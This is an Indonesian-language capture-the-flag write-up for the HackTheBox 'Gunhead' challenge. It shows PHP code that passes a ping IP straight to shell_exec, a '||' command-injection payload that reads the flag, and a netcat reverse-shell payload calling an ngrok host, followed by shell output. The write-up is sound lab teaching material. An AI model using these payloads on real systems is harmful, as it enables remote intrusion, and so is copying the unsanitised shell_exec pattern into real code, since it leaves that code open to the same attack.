Description :

During Pandora’s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, 
causing it to become uncontrollable. With the situation escalating rapidly, 
Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down.

Enumeration:

Dalam tantangan ini, kita dapat mengunduh file yang disediakan:
Tapi sebelum kita melihat kode sumbernya, mari bermain dengan aplikasinya.

Status:
![image](https://user-images.githubusercontent.com/113104087/230796394-a5810d3b-b6aa-427c-baa5-15d1bd247e52.png)

Ini akan menunjukkan status "Integer".

Kebutuhan :
![image](https://user-images.githubusercontent.com/113104087/230796408-79619d12-829d-478d-ba34-32fd9d5655e8.png)

Tunjukkan apa yang dibutuhkan "Integer".

Perintah:

![image](https://user-images.githubusercontent.com/113104087/230796422-595ebea0-ba78-4ce9-bfe3-e07c94d3da5e.png)

Oh! Sepertinya kita bisa menjalankan beberapa perintah?
Ayo ketik `/help` :
![image](https://user-images.githubusercontent.com/113104087/230796434-ef8f46e7-bc1d-4086-98ff-f19b52eb12a8.png)

![image](https://user-images.githubusercontent.com/113104087/230796438-2a9c8085-9abf-4da7-b924-16383c75da41.png)

Dingin! Kita dapat `/clear` command prompt, `/ping` [device IP] untuk mengecek sistem pengintaian, `/storage` untuk mengecek penyimpanan.

Hmm… Saya bisa mencium beberapa injeksi perintah OS !
Mari kita lihat kode sumbernya!
![image](https://user-images.githubusercontent.com/113104087/230796469-15050c6f-3abc-4fd1-aa41-d62393c023a6.png)
Struktur aplikasi web menggunakan model yang disebut MVC, atau Model-View-Controller .

Di dalam `controllers/ReconController.php`, ada `ping()`metode:
```js
<?php
class ReconController
{
    public function index($router)
    {
        return $router->view('index');
    }

    public function ping($router)
    {
        $jsonBody = json_decode(file_get_contents('php://input'), true);

        if (empty($jsonBody) || !array_key_exists('ip', $jsonBody))
        {
            return $router->jsonify(['message' => 'Insufficient parameters!']);
        }

        $pingResult = new ReconModel($jsonBody['ip']);

        return $router->jsonify(['output' => $pingResult->getOutput()]);
    }
}
```
Metode ini `ping()` akan mendapatkan badan JSON yang didekodekan, dan mem-parsing `ip` kunci ke `ReconModel()`.

Apa itu `ReconModel()`?

Di dalamnya `models/ReconModel.php` sangat menarik bagi kami:
```js
<?php
#[AllowDynamicProperties]

class ReconModel
{   
    public function __construct($ip)
    {
        $this->ip = $ip;
    }

    public function getOutput()
    {
        # Do I need to sanitize user input before passing it to shell_exec?
        return shell_exec('ping -c 3 '.$this->ip);
    }
}
```
Seperti yang Anda lihat, `ReconModel` metode publik kelas `getOutput()` menggunakan fungsi bernama `shell_exec()`, yang menjalankan perintah OS !!
Jika ada input yang tidak divalidasi dan disanitasi masuk ke sana, kita dapat mencapai Eksekusi Kode Jarak Jauh (RCE)!!
Ingat, sedang $ipdiurai dari badan JSON dalam ping()metode!!
Karena itu, kita bisa mendapatkan RCE melalui `/ping` perintah!
```
EKSPLOITASI
```
Sekarang, mari kita coba ping 127.0.0.1, atau localhost:
![image](https://user-images.githubusercontent.com/113104087/230796579-eede959b-a938-451c-a2f0-db90d34327b3.png)
Riwayat HTTP Burp Suite:
![image](https://user-images.githubusercontent.com/113104087/230796589-35578118-4f38-4c84-ae03-9902199c73dd.png)

Saat kita mengetik perintah itu, itu akan mengirimkan permintaan POST ke `/api/ping`, dengan badan JSON.
Jika tidak ada kesalahan, itu memberi kami data JSON, yang merupakan keluaran perintah.
Berbekal informasi di atas, kami dapat mengirimkan permintaan itu ke Repeater Burp Suite, dan menyuntikkan beberapa perintah!!
Setelah beberapa pengujian `||` bekerja!
![image](https://user-images.githubusercontent.com/113104087/230796630-6efbc144-c3a3-43f2-813b-2eb6e1b3d0f0.png)

Bagus! Sekarang kami dapat mengonfirmasi bahwa ada kerentanan RCE melalui shell_exec!
Ayo baca bendera!
```js
{
    "ip":" || cat ../flag.txt"
}
```
![image](https://user-images.githubusercontent.com/113104087/230796660-602e4716-0efc-4668-af53-30cb00f6e85f.png)

Atau, bisa mendapatkan shell :D

```
ngrok tcp port
nc -lnvp port
```
payload :
```
{
    "ip":" || nc 0.tcp.ap.ngrok.io 17969 -e '/bin/sh'"
}
```
nc -lnvp 4444
```
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 56612
whoami;hostname;id;ip a
www
ng-gunhead-axuru-69c8bcb87c-nsl6z
uid=1000(www) gid=1000(www) groups=1000(www)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
26: eth0@if27: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether fa:1e:e5:23:24:12 brd ff:ff:ff:ff:ff:ff
    inet 10.244.17.207/32 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::f81e:e5ff:fe23:2412/64 scope link 
       valid_lft forever preferred_lft forever
cat ../flag.txt
```

flag : `HTB{4lw4y5_54n1t1z3_u53r_1nput!!!}`
